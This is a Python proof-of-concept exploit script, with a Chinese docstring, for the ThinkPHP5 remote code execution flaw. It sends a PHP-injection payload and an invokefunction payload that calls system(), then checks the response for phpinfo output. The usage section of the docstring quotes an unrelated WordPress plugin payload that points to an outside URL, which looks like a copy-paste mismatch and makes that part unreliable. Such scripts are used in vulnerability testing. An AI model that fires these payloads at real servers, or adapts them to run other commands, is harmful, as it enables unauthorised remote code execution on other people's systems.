#!/usr/bin/env python		
#coding:utf-8

"""
ThinkPHP5 <=5.0.22/<=5.1.29 远程代码执行漏洞

Desc
    2018年12月10日中午，thinkphp官方公众号发布了一个更新通知，包含了一个5.x系列所有版本存在被getshell的高风险漏洞。
    由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，
    受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。
Version
	ThinkPHP5.0 版本 <= 5.0.22 ThinkPHP5.1 版本 <= 5.1.29
Usage:
	1. python POC-S.py -s 
	2. POC: /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://lj.s7star.cn/info.txt
Referer
	https://www.seebug.org/vuldb/ssvid-9771
"""
import requests

def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')
    payloads = [
        r"/index.php?s=index/\think\view\driver\Php/display&content=<?php%20phpinfo();?>",
        r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'"
    ]
    for payload in payloads:
        vulnurl = url + payload
        try:
            res = requests.get(vulnurl)
            if "allow_url_fopen" in res.text:
                return True
        except Exception as e:
            print(e)
    return False


if __name__ == "__main__":
    print poc("http://192.168.218.145:8080/")